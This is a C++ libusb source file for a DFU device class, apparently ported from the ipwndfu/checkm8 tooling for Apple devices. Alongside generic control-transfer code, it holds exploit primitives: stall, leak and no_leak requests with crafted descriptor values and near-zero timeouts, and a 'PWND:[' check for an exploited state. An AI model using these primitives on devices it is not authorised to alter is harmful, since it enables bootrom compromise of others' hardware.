#include "dfu.h"

#include <algorithm>
#include <assert.h>
#include <cstring>
#include <iostream>
#include <string>
#include <time.h>

static void printBuffer(std::vector<uint8_t> &V) {
#ifndef DEBUG
  return;
#endif
  printf("Buffer (%d): ", (int)V.size());
  for (int i = 0; i < V.size(); i++) {
    printf("%02X", V[i]);
  }
  printf("\n");
}

static void printBuffer(uint8_t *V, int Size) {
#ifndef DEBUG
  return;
#endif
  printf("Buffer (%d): ", (int)Size);
  for (int i = 0; i < Size; i++) {
    printf("%02X", V[i]);
  }
  printf("\n");
}

static void my_sync_transfer_cb(struct libusb_transfer *transfer) {
  int *completed = (int *)transfer->user_data;
  *completed = 1;
}

// Set static ctx
libusb_context *DFU::ctx = nullptr;

void DFU::sync_transfer_wait_for_completion(struct libusb_transfer *transfer) {
  int r, *completed = (int *)transfer->user_data;
  struct libusb_context *ctx = DFU::ctx;

  while (!*completed) {
    r = libusb_handle_events_completed(ctx, completed);
    if (r < 0) {
      if (r == LIBUSB_ERROR_INTERRUPTED)
        continue;
      libusb_cancel_transfer(transfer);
      continue;
    }
    if (NULL == transfer->dev_handle) {
      /* transfer completion after libusb_close() */
      transfer->status = LIBUSB_TRANSFER_NO_DEVICE;
      *completed = 1;
    }
  }
}

int DFU::my_libusb_control_transfer(libusb_device_handle *dev_handle,
                                    uint8_t bmRequestType, uint8_t bRequest,
                                    uint16_t wValue, uint16_t wIndex,
                                    unsigned char *data, uint16_t wLength,
                                    unsigned int timeout,
                                    vector<uint8_t> &dataOut) {
  struct libusb_transfer *transfer;
  unsigned char *buffer;
  int completed = 0;
  int r;

  transfer = libusb_alloc_transfer(0);
  if (!transfer)
    return LIBUSB_ERROR_NO_MEM;

  buffer = (unsigned char *)malloc(LIBUSB_CONTROL_SETUP_SIZE + wLength);
  if (!buffer) {
    libusb_free_transfer(transfer);
    return LIBUSB_ERROR_NO_MEM;
  }

  libusb_fill_control_setup(buffer, bmRequestType, bRequest, wValue, wIndex,
                            wLength);
  if ((bmRequestType & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_OUT)
    memcpy(buffer + LIBUSB_CONTROL_SETUP_SIZE, data, wLength);

  libusb_fill_control_transfer(transfer, dev_handle, buffer,
                               my_sync_transfer_cb, &completed, timeout);
  transfer->flags = LIBUSB_TRANSFER_FREE_BUFFER;
  r = libusb_submit_transfer(transfer);
  if (r < 0) {
    libusb_free_transfer(transfer);
    return r;
  }

  sync_transfer_wait_for_completion(transfer);

  // pgarba:
  // Check if data is a null ptr. This leads to a crash on windows and others
  if (data && (bmRequestType & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_IN)
    memcpy(data, libusb_control_transfer_get_data(transfer),
           transfer->actual_length);

  // pgarba:
  // Fill data out buffer
  // In the python scripts it will write to data ...
  // which of course should lead to a crash if data is not a valid ptr...
  // Wondering how it even could have work ?!?
  uint8_t *UD = libusb_control_transfer_get_data(transfer);
  dataOut.clear();
  uint8_t *Start = UD;
  uint8_t *End = Start + transfer->actual_length;
  dataOut.insert(dataOut.end(), Start, End);

  switch (transfer->status) {
  case LIBUSB_TRANSFER_COMPLETED:
    r = transfer->actual_length;
    break;
  case LIBUSB_TRANSFER_TIMED_OUT:
    r = LIBUSB_ERROR_TIMEOUT;
    break;
  case LIBUSB_TRANSFER_STALL:
    r = LIBUSB_ERROR_PIPE;
    break;
  case LIBUSB_TRANSFER_NO_DEVICE:
    r = LIBUSB_ERROR_NO_DEVICE;
    break;
  case LIBUSB_TRANSFER_OVERFLOW:
    r = LIBUSB_ERROR_OVERFLOW;
    break;
  case LIBUSB_TRANSFER_ERROR:
  case LIBUSB_TRANSFER_CANCELLED:
    r = LIBUSB_ERROR_IO;
    break;
  default:
    r = LIBUSB_ERROR_OTHER;
  }

  libusb_free_transfer(transfer);
  return r;
}

string DFU::getSerialNumber() { return this->SerialNumber; }

bool DFU::isExploited() {
  if (SerialNumber.find("PWND:[") != std::string::npos)
    return true;

  return false;
}

bool DFU::acquire_device(bool Silent) {
  devh = libusb_open_device_with_vid_pid(NULL, idVendor, idProduct);
  if (!devh) {
    printf("[!] Could not find device in DFU mode!\n");
    exit(1);
  }

  device = libusb_get_device(devh);

  // Claim device
  int r = libusb_claim_interface(devh, 0);
  if (r < 0) {
    printf("[!] libusb_claim_interface error %d\n", r);
    exit(1);
  }

  r = libusb_get_device_descriptor(device, &desc);
  if (r < 0) {
    printf("[!] libusb_get_device_descriptor error %d\n", r);
    exit(1);
  }

  char SerialNumber[2048];
  r = libusb_get_string_descriptor_ascii(devh, desc.iSerialNumber,
                                         (unsigned char *)SerialNumber,
                                         sizeof(SerialNumber));
  if (r < 0) {
    printf("[!] libusb_get_string_descriptor_ascii error %d\n", r);
    return true;
    exit(1);
  }

  this->SerialNumber = SerialNumber;

  if (!Silent) {
    std::cout << "[*] Device Serial Number: " << this->SerialNumber << "\n";
  }

  return true;
}

void DFU::release_device() {
  libusb_release_interface(devh, 0);
  libusb_close(devh);
  devh = nullptr;
  device = nullptr;
}

void DFU::usb_reset() { int Result = libusb_reset_device(this->devh); }

void DFU::stall() {
  std::vector<uint8_t> Buffer;
  Buffer.insert(Buffer.end(), 0xC0, 'A');

  libusb1_async_ctrl_transfer(0x80, 6, 0x304, 0x40A, Buffer, 0.00001);
}

void DFU::no_leak() {
  libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, nullptr, 0xC1, 1);
}

void DFU::usb_req_stall() {
  libusb1_no_error_ctrl_transfer(0x2, 3, 0x0, 0x80, nullptr, 0x0, 10);
}

void DFU::usb_req_leak() {
  libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, nullptr, 0x40, 1);
}

struct libusb_transfer *
DFU::libusb1_create_ctrl_transfer(std::vector<uint8_t> &request, int timeout) {
  auto *ptr = libusb_alloc_transfer(0);
  ptr->dev_handle = this->devh;
  ptr->endpoint = 0; // EP0
  ptr->type = 0;     //#LIBUSB_TRANSFER_TYPE_CONTROL
  ptr->timeout = timeout;
  ptr->buffer = request.data(); // #C - pointer to request buffer
  ptr->length = (int)request.size();
  ptr->user_data = nullptr;
  ptr->callback = nullptr;
  ptr->flags = 1 << 1; // #LIBUSB_TRANSFER_FREE_BUFFER

  return ptr;
}

bool DFU::libusb1_async_ctrl_transfer(int bmRequestType, int bRequest,
                                      int wValue, int wIndex,
                                      std::vector<uint8_t> &data,
                                      double timeout) {
  int request_timeout = 0;
  if (timeout >= 1.) {
    request_timeout = (int)timeout;
  }

  auto start = time(nullptr);

  std::vector<uint8_t> Request;
  append(Request, (uint8_t)bmRequestType);
  append(Request, (uint8_t)bRequest);
  append(Request, (uint16_t)wValue);
  append(Request, (uint16_t)wIndex);
  append(Request, (uint16_t)data.size());
  assert(Request.size() == 8);
  appendV(Request, data);
  auto rawRequest = libusb1_create_ctrl_transfer(Request, request_timeout);

  printBuffer(Request);

  int r = libusb_submit_transfer(rawRequest);
  if (r) {
    printf("[!] libusb_submit_transfer failed! %d %s\n", r,
           libusb_strerror((libusb_error)r));
    exit(1);
  }

  // Wait for timeout
  int i = 0;
  int t = (timeout / 1000.0);
  while ((time(nullptr) - start) < t) {
    i++;
  }

  r = libusb_cancel_transfer(rawRequest);
  if (r) {
    printf("[!] libusb_cancel_transfer failed! %d %s\n", r,
           libusb_strerror((libusb_error)r));
    exit(1);
  }

  return true;
}

vector<uint8_t> DFU::ctrl_transfer(uint8_t bmRequestType, uint8_t bRequest,
                                   uint16_t wValue, uint16_t wIndex,
                                   uint8_t *data, size_t length, int timeout) {
  vector<uint8_t> Response;
  my_libusb_control_transfer(this->devh, bmRequestType, bRequest, wValue,
                             wIndex, data, length, timeout, Response);
  return Response;
}

bool DFU::libusb1_no_error_ctrl_transfer(uint8_t bmRequestType,
                                         uint8_t bRequest, uint16_t wValue,
                                         uint16_t wIndex, uint8_t *data,
                                         size_t length, int timeout) {

  vector<uint8_t> response;
  // Crash on Windows because data will be written back to nullptr data.
  // should also crazy in the python version ...
  // our own version will work
  my_libusb_control_transfer(this->devh, bmRequestType, bRequest, wValue,
                             wIndex, data, length, timeout, response);

  return false;
}

void DFU::send_data(vector<uint8_t> data) {
  int index = 0;
  while (index < data.size()) {
    int amount = min(data.size() - index, MAX_PACKET_SIZE);

    vector<uint8_t> response;
    auto r = my_libusb_control_transfer(
        this->devh, 0x21, 1, 0, 0, &data.data()[index], amount, 5000, response);
    assert(r == amount);

    index += amount;
  }
}
